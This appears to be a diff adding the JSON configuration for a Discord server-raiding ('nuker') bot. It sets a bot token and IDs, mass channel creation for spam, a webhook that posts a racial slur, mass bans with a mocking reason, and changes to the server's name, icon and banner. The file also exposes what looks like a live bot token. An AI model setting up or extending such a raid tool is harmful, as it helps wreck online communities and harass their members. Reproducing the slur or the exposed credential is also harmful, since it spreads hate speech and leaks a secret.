@@ -1,0 +1,34 @@
+{
+    "token": "MTE2OTc4NDI1MDcxNTg3MzQyMQ.GyUHYf.LHEqfjdzKD_O_Qdu3LZWw2FA2PcmWng-X1g8jc", 
+    "clientID": "1169784250715873421", 
+    "admins": ["1117915318086549504"], 
+    "botName": "TesseractDestroyers", 
+    "fakeServers": "10", 
+    "advancedOptions": {  
+
+        "enabled": false, 
+
+        "channels": {
+            "channelNames": "NAME OF CHANNEL THAT WILL BE SPAMMED", 
+            "amount": 25
+        },
+
+        "webhook": {
+            "name": "TesseractDestroyersFucker", 
+            "avatar": "https://cdna.artstation.com/p/assets/images/images/016/956/882/large/nitrozotic-nz-nuclear-boi-redux-gd-pfp.jpg?1554127847", 
+            "message": "GET FUCKED NIGGA" 
+        },
+
+        "banning": {
+            "enabled": false, 
+            "banReason": "HAHhaHAHA BAnNED " 
+        },
+
+        "server": {
+            "nameChange": "TesseractDestroyers🤡🤓🖕😂", 
+            "iconChange": "https://cdna.artstation.com/p/assets/images/images/016/956/882/large/nitrozotic-nz-nuclear-boi-redux-gd-pfp.jpg?1554127847",
+            "bannerChange": "CHANGES SERVER BANNER, ONLY WORKS ON LEVEL 2 BOOSTED SERVERS, MUST BE DIRECT LINK" 
+        }
+        
+    }
+}
